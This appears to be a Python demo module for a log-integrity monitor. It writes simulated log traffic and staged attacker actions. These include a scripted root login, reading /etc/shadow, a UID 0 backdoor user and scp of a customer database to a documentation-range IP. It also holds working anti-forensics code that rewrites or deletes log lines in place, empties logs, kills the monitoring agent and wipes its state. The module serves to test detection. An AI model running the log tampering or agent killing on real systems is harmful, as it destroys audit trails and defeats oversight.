"""Demo helpers: realistic log traffic and the attacker's actions (run on System A).

All IP addresses come from the documentation ranges (RFC 5737), so nothing points at a real host.
"""
from __future__ import annotations

import os
import random
import shutil
import signal
import time
from pathlib import Path

from .ui import c, log

ATTACKER_IP = "203.0.113.66"
BACKDOOR_USER = "sysupdate"


def _ts() -> str:
    """Classic syslog timestamp, e.g. 'Nov  5 10:15:01'."""
    t = time.localtime()
    return f"{time.strftime('%b', t)} {t.tm_mday:>2} {time.strftime('%H:%M:%S', t)}"


def _iso() -> str:
    t = time.time()
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(t)) + f".{int(t * 1000) % 1000:03d}Z"


def _append(path: Path, line: str) -> None:
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")
        f.flush()
        os.fsync(f.fileno())


def _auth_line(host: str) -> str:
    pid = random.randint(1200, 48000)
    r = random.random()
    if r < 0.30:
        user, ip = random.choice([("deploy", "198.51.100.24"), ("backup", "198.51.100.31"), ("ops-anita", "198.51.100.57")])
        return f"{_ts()} {host} sshd[{pid}]: Accepted publickey for {user} from {ip} port {random.randint(40000, 65000)} ssh2: ED25519 SHA256:{os.urandom(8).hex()}"
    if r < 0.55:
        user = random.choice(["admin", "test", "oracle", "ubuntu", "postgres"])
        return f"{_ts()} {host} sshd[{pid}]: Failed password for invalid user {user} from 192.0.2.{random.randint(2, 250)} port {random.randint(30000, 65000)} ssh2"
    if r < 0.72:
        return f"{_ts()} {host} CRON[{pid}]: pam_unix(cron:session): session opened for user www-data(uid=33) by (uid=0)"
    if r < 0.86:
        return f"{_ts()} {host} systemd-logind[812]: New session {random.randint(100, 999)} of user deploy."
    if r < 0.93:
        return f"{_ts()} {host} sshd[{pid}]: Disconnected from user deploy 198.51.100.24 port {random.randint(40000, 65000)}"
    return f"{_ts()} {host} sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart payments-api"


def _app_line() -> str:
    r = random.random()
    uid = f"u_{random.randint(1000, 9999)}"
    if r < 0.45:
        return f"{_iso()} INFO  payments-api POST /api/v1/payments 201 {random.randint(18, 90)}ms user={uid} amount={random.randint(100, 50000)}.00 INR"
    if r < 0.75:
        return f"{_iso()} INFO  payments-api GET /api/v1/accounts/{uid} 200 {random.randint(4, 30)}ms"
    if r < 0.88:
        return f"{_iso()} WARN  payments-api POST /api/v1/login 401 {random.randint(8, 40)}ms user={uid} reason=bad_password"
    return f"{_iso()} INFO  payments-api settlement batch #{random.randint(1000, 9999)} completed records={random.randint(20, 400)}"


def generate(cfg: dict, rate: float = 1.5) -> None:
    """Write realistic auth/app log traffic until interrupted."""
    srcs = {s["name"]: Path(s["path"]) for s in cfg["sources"]}
    for p in srcs.values():
        p.parent.mkdir(parents=True, exist_ok=True)
        p.touch(exist_ok=True)
    auth = srcs.get("auth.log")
    app = srcs.get("app.log")
    host = cfg["agent_id"]
    log("demo", f"Writing demo log traffic to {', '.join(str(p) for p in srcs.values())} (Ctrl+C to stop)")
    try:
        while True:
            if auth and (not app or random.random() < 0.55):
                line = _auth_line(host)
                _append(auth, line)
            elif app:
                line = _app_line()
                _append(app, line)
            log("demo", c.dim(line[:110]))
            time.sleep(random.uniform(0.4, 2.0) * rate)
    except KeyboardInterrupt:
        pass


def _source_path(cfg: dict, name: str) -> Path:
    for s in cfg["sources"]:
        if s["name"] == name:
            return Path(s["path"])
    raise SystemExit(f"No watched source named {name!r}. Watched: {', '.join(s['name'] for s in cfg['sources'])}")


def _is_real(cfg: dict, path: Path) -> bool:
    return not cfg.get("demo_traffic", True) or not str(path).startswith(str(Path(cfg["state_dir"]).parent))


def _rewrite(path: Path, lines: list[str]) -> None:
    """Rewrite the file in place (same inode), as `vim` or a careful attacker would.

    Keeping the inode means rsyslog keeps writing to the file after the attack.
    """
    data = "".join(ln + "\n" for ln in lines).encode("utf-8")
    with open(path, "r+b") as f:
        f.seek(0)
        f.write(data)
        f.truncate()
        f.flush()
        os.fsync(f.fileno())


def _read_lines(path: Path) -> list[str]:
    try:
        return path.read_text(encoding="utf-8", errors="replace").splitlines()
    except PermissionError:
        raise SystemExit(f"Permission denied on {path}. Real attackers have root - run it with sudo:  sudo ./rd attack ...")


def _targets(lines: list[str], line: int | None, match: str | None) -> list[int]:
    if line is not None:
        if not 1 <= line <= len(lines):
            raise SystemExit(f"--line must be between 1 and {len(lines)}")
        return [line - 1]
    if match:
        idx = [i for i, ln in enumerate(lines) if match in ln]
        if not idx:
            raise SystemExit(f"No line contains {match!r}")
        return idx
    idx = [i for i, ln in enumerate(lines) if ATTACKER_IP in ln or BACKDOOR_USER in ln]
    if not idx:
        raise SystemExit("Say which lines to target: --match TEXT or --line N  (e.g. --match '/etc/shadow')")
    return idx


def _real_intrusion() -> None:
    """Generate REAL security events through PAM/sudo, so the system itself writes them to auth.log."""
    import getpass
    import subprocess

    user = getpass.getuser()
    print(c.bold("Real intrusion: these commands run for real and the system logs them itself."))
    print(c.dim("  1/2  three sudo attempts with a wrong password (real PAM authentication failures)"))
    for _ in range(3):
        subprocess.run(["sudo", "-k"], check=False)
        subprocess.run(["sudo", "-S", "-p", "", "true"], input="definitely-wrong-password\n", text=True,
                       capture_output=True, check=False)
        time.sleep(0.4)
    print(c.dim("  2/2  privileged read of the password hashes:  sudo cat /etc/shadow   (enter YOUR password)"))
    subprocess.run(["sudo", "sh", "-c", "cat /etc/shadow > /dev/null"], check=False)
    print(c.red(f"Done. auth.log now holds real entries: failed sudo attempts by '{user}' and 'COMMAND=/usr/bin/sh -c cat /etc/shadow'."))
    print("Next, cover the tracks (as root):  " + c.bold("sudo ./rd attack delete --match '/etc/shadow'"))


def attack(cfg: dict, action: str, source: str = "auth.log", line: int | None = None, match: str | None = None,
           replace: list[str] | None = None, text: str | None = None) -> None:
    path = _source_path(cfg, source)
    real = _is_real(cfg, path)
    host = cfg["agent_id"]
    state = Path(cfg["state_dir"])
    if action == "intrude":
        if real:
            _real_intrusion()
            return
        pid = random.randint(20000, 30000)
        for ln in [
            f"{_ts()} {host} sshd[{pid}]: Failed password for root from {ATTACKER_IP} port 51022 ssh2",
            f"{_ts()} {host} sshd[{pid}]: Accepted password for root from {ATTACKER_IP} port 51022 ssh2",
            f"{_ts()} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)",
            f"{_ts()} {host} sudo:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
            f"{_ts()} {host} useradd[{pid + 7}]: new user: name={BACKDOOR_USER}, UID=0, GID=0, home=/var/lib/{BACKDOOR_USER}, shell=/bin/bash",
            f"{_ts()} {host} sudo:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /srv/app/customers.db {ATTACKER_IP}:/tmp/",
        ]:
            _append(path, ln)
            time.sleep(0.25)
        print(c.red(f"[simulated] Attacker {ATTACKER_IP} logged in as root, read /etc/shadow, created backdoor user "
                    f"'{BACKDOOR_USER}' and copied customers.db off the server."))
        return
    if action in ("edit", "delete"):
        lines = _read_lines(path)
        idx = _targets(lines, line, match)
        nums = ", ".join(str(i + 1) for i in idx)
        if action == "delete":
            gone = set(idx)
            _rewrite(path, [ln for i, ln in enumerate(lines) if i not in gone])
            print(c.red(f"Deleted {len(idx)} line(s) from {path}: {nums}"))
            return
        for i in idx:
            if text is not None:
                lines[i] = text
            elif replace:
                lines[i] = lines[i].replace(replace[0], replace[1])
            elif ATTACKER_IP in lines[i] or BACKDOOR_USER in lines[i]:
                lines[i] = (lines[i].replace(ATTACKER_IP, "198.51.100.24").replace("for root", "for deploy")
                            .replace(f"name={BACKDOOR_USER}", "name=backup").replace("cat /etc/shadow", "systemctl status nginx"))
            else:
                raise SystemExit("Say how to change the line: --replace OLD NEW  or  --text 'new line'")
        _rewrite(path, lines)
        print(c.red(f"Rewrote {len(idx)} line(s) in {path}: {nums}"))
        return
    if action == "kill":
        pidf = state / "agent.pid"
        if not pidf.exists():
            raise SystemExit("Agent does not appear to be running (no pid file).")
        pid = int(pidf.read_text())
        os.kill(pid, signal.SIGKILL)
        print(c.red(f"Killed the Root-Defense agent (pid {pid}) with SIGKILL - it can no longer report."))
        return
    if action == "wipe":
        pidf = state / "agent.pid"
        if pidf.exists():
            try:
                os.kill(int(pidf.read_text()), signal.SIGKILL)
                print(c.red("Killed the agent first."))
            except ProcessLookupError:
                pass
        shutil.rmtree(state, ignore_errors=True)
        print(c.red(f"Wiped the agent's local database, keys and state ({state})."))
        return
    if action == "truncate":
        _read_lines(path)
        _rewrite(path, [])
        print(c.red(f"Emptied {path} completely."))
        return
    raise SystemExit(f"unknown attack {action}")
